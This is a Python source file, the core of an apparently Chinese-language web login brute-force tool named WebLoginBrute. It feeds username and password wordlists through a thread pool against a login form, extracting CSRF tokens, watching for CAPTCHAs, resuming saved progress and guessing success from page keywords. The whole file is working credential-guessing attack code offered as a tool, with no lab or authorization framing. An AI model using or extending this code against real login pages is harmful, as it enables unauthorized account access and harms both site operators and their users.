#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import logging
import os
import signal
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Event, RLock
from typing import List

from .config import Config
from .exceptions import RateLimitError
from .http_client import HttpClient
from .logger import setup_logging
from .parsers import analyze_form_fields, contains_captcha, extract_token
from .reporting import StatsManager
from .state import StateManager
from .wordlists import load_wordlist


class WebLoginBrute:
    """
    核心流程调度类，负责整体爆破流程的编排与异常处理。
    """

    def __init__(self, config: Config) -> None:
        assert config.url and config.action and config.users and config.passwords, "核心配置参数不能为空"
        self.config = config
        setup_logging(config.verbose)
        self.http = HttpClient(config)
        self.state = StateManager(config)
        self.stats = StatsManager()
        self.success = Event()
        self.executor = None
        self._shutdown_requested = False
        
        # 注册信号处理器
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)

    def _signal_handler(self, signum, frame):
        """处理中断信号"""
        logging.info(f"收到信号 {signum}，正在优雅关闭...")
        self._shutdown_requested = True
        self.success.set()
        if self.executor:
            self.executor.shutdown(wait=False)
            self.executor = None

    def run(self) -> None:
        """主运行方法"""
        assert self.config.url and self.config.action and self.config.users and self.config.passwords, "核心配置参数不能为空"
        logging.info("开始WebLoginBrute主流程...")
        
        try:
            self._initialize_components()
            self._load_wordlists()
            self._setup_executor()
            self._execute_brute_force()
        except KeyboardInterrupt:
            self._handle_interruption()
        except Exception as e:
            self._handle_error(e)
        finally:
            self._cleanup_resources()

    def _initialize_components(self):
        """初始化组件"""
        self.http.pre_resolve_targets([self.config.url, self.config.action])
        logging.info("组件初始化完成")

    def _load_wordlists(self):
        """加载字典文件"""
        usernames = list(load_wordlist(self.config.users, self.config))
        passwords = list(load_wordlist(self.config.passwords, self.config))
        logging.info(f"加载了 {len(usernames)} 个用户名和 {len(passwords)} 个密码")
        
        # 恢复进度
        loaded_attempts, stats_from_file = self.state.load_progress()
        if stats_from_file:
            self.stats.update_from_progress(stats_from_file)
        
        self.usernames = usernames
        self.passwords = passwords

    def _setup_executor(self):
        """设置线程池"""
        self.executor = ThreadPoolExecutor(
            max_workers=self.config.threads, thread_name_prefix="WebLoginBrute"
        )
        self.stats.stats["start_time"] = time.time()
        logging.info("线程池设置完成")

    def _execute_brute_force(self):
        """执行暴力破解"""
        self._brute_force(self.usernames, self.passwords)

    def _handle_interruption(self):
        """处理用户中断"""
        logging.info("用户中断操作，保存进度...")
        self.state.save_progress(self.stats.get_stats())

    def _handle_error(self, error):
        """处理运行错误"""
        logging.error(f"运行过程中发生错误: {error}")
        self.state.save_progress(self.stats.get_stats())

    def _cleanup_resources(self):
        """清理资源"""
        # 确保线程池正确关闭
        if self.executor:
            try:
                # 先取消所有未完成的任务
                self.executor.shutdown(wait=False, cancel_futures=True)
                logging.debug("线程池已关闭，所有未完成任务已取消")
            except Exception as e:
                logging.warning(f"关闭线程池时发生错误: {e}")
            finally:
                self.executor = None
        
        # 确保所有资源都被释放
        try:
            self.stats.stats["end_time"] = time.time()
            self.stats.finalize()
            self.stats.print_final_report()
            if self.success.is_set():
                self.state.cleanup_progress_file()
            self.http.close_all_sessions()
        except Exception as e:
            logging.error(f"清理资源时发生错误: {e}")
        finally:
            import logging as _logging
            _logging.shutdown()

    def _brute_force(self, usernames: List[str], passwords: List[str]):
        total_combinations = len(usernames) * len(passwords)
        logging.info(f"开始暴力破解，总共 {total_combinations} 个组合")
        # 过滤已尝试的组合
        combinations = [
            (u, p)
            for u in usernames
            for p in passwords
            if not self.state.has_been_attempted((u, p))
        ]
        logging.info(f"过滤后剩余 {len(combinations)} 个组合")
        # 提交任务到线程池
        if not self.executor:
            raise RuntimeError("线程池未初始化")
        futures = []
        for username, password in combinations:
            if self.success.is_set() or self._shutdown_requested:
                break
            future = self.executor.submit(self._try_login, username, password)
            futures.append(future)
            if len(futures) >= self.config.threads:
                self._wait_for_futures(futures)
                futures = []
        if futures:
            self._wait_for_futures(futures)

    def _wait_for_futures(self, futures):
        for future in as_completed(futures):
            try:
                result = future.result()
                if result:
                    self.success.set()
                    break
            except Exception as e:
                logging.error(f"任务执行失败: {e}")

    def _try_login(self, username: str, password: str) -> bool:
        if self.success.is_set() or self._shutdown_requested:
            return False
        try:
            resp = self._get_login_page(username, password)
            if not resp or not resp.text:
                self.stats.update("other_errors")
                return False
            token = self._extract_token(resp, username, password)
            data = self._build_login_data(username, password, token)
            resp2 = self.http.post(self.config.action, data=data)
            return self._handle_login_response(resp2, username, password)
        except RateLimitError as e:
            logging.error(f"频率限制错误: {e}")
            self.stats.update("rate_limit_errors")
            return False
        except Exception as e:
            logging.error(f"未知错误: {e}")
            self.stats.update("other_errors")
            return False

    def _get_login_page(self, username, password):
        resp = self.http.get(self.config.url)
        analyze_form_fields(resp.text)
        return resp

    def _extract_token(self, resp, username, password):
        token = None
        if self.config.csrf:
            token = extract_token(
                resp.text, resp.headers.get("Content-Type", ""), self.config.csrf
            )
            if not token:
                logging.warning(f"未能为 {username}:{password} 提取Token")
        return token

    def _build_login_data(self, username, password, token):
        data = {"username": username, "password": password}
        if self.config.csrf and token:
            data[self.config.csrf] = token
        if self.config.login_field and self.config.login_value:
            data[self.config.login_field] = self.config.login_value
        return data

    def _handle_login_response(self, resp2, username, password):
        if self._check_login_success(resp2):
            logging.info(f"登录成功: {username}:{password}")
            self.stats.update("successful_attempts")
            return True
        if contains_captcha(resp2.text):
            self.stats.update("captcha_detected")
            logging.warning(f"检测到验证码: {username}:{password}")
        self.stats.update("total_attempts")
        self.state.add_attempted((username, password))
        if self.stats.stats["total_attempts"] % 100 == 0:
            self.state.save_progress(self.stats.get_stats())
        return False

    def _check_login_success(self, response, success_keywords=None, failure_keywords=None) -> bool:
        if not response or not response.text:
            return False
        if success_keywords is None:
            success_keywords = ["welcome", "dashboard", "logout", "profile", "success"]
        if failure_keywords is None:
            failure_keywords = ["invalid", "incorrect", "failed", "error", "login"]
        text = response.text.lower()
        success_count = sum(1 for k in success_keywords if k in text)
        failure_count = sum(1 for k in failure_keywords if k in text)
        return success_count > failure_count
